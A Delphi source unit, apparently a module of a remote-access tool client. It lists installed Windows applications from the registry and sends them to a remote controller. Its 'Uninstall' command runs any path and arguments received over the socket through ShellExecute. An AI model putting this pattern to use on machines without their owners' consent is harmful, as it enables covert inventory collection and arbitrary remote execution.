unit UnitInstalledApplications;

interface

uses
  applicationunit,windows,socketunit, unitshareddata, CompressionStreamUnit,ShlObj,ShFolder,
    ShellAPi, ImageHlp;

procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'InstalledApplications|' + Data);
end;


function RegReadString(Key: HKey; SubKey: string; DataType: integer; Data: string): string;
var
  RegKey: HKey;
  Buffer: array[0..9999] of Char;
  BufSize: Integer;
begin
  BufSize := SizeOf(Buffer);
  Result := '';
  if RegOpenKey(Key,pchar(SubKey),RegKey) = ERROR_SUCCESS then begin;
    if RegQueryValueEx(RegKey, pchar(Data), nil,  @DataType, @Buffer, @BufSize) = ERROR_SUCCESS then begin;
      RegCloseKey(RegKey);
      Result := string(Buffer);
    end;
  end;
end;


function _regEnumKeys(hkKey: HKEY; lpSubKey: PChar): string;
var
  dwIndex, lpcbName: DWORD;
  phkResult: HKEY;
  lpName: Array[0..MAX_PATH] of Char;
begin
  Result := '';

  if RegOpenKeyEx(hkKey, lpSubKey, 0, KEY_READ, phkResult) = ERROR_SUCCESS then begin
    dwIndex := 0;
    lpcbName := sizeof(lpName);
    ZeroMemory(@lpName, sizeof(lpName));

    while RegEnumKeyEx(phkResult, dwIndex, @lpName, lpcbName, nil, nil, nil, nil) <> ERROR_NO_MORE_ITEMS do begin

      Result := Result + RegReadString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\' + lpName + '\',REG_SZ,'DisplayName') ;
      Result := Result + '|';

      Result := Result + RegReadString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\' + lpName + '\',REG_SZ,'DisplayVersion') ;
      Result := Result + '|';

      Result := Result + RegReadString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\' + lpName + '\',REG_SZ,'Publisher') ;
      Result := Result + '|';

      Result := Result + RegReadString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\' + lpName + '\',REG_SZ,'UninstallString') ;
      Result := Result + '|';

      Result := Result + RegReadString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\' + lpName + '\',REG_SZ,'QuietUninstallString') ;
      Result := Result + #13#10;


      ZeroMemory(@lpName, sizeof(lpName));
      lpcbName := sizeof(lpName);
      inc(dwIndex);
    end;

    RegCloseKey(phkResult);
  end;
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
  ProcInfo: TProcessInformation;
  StartInfo: TStartupInfo;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'List' then begin
    SendData(Socket,Command + '|' + _regEnumKeys(HKEY_LOCAL_MACHINE,'software\microsoft\windows\currentversion\uninstall\'));
  end;

  if Command = 'Uninstall' then begin
    ShellExecute(0,'open',pchar(split(Data,'|',1)),pchar(split(Data,'|',2)),'',SW_SHOWNORMAL);
  end;

end;

end.
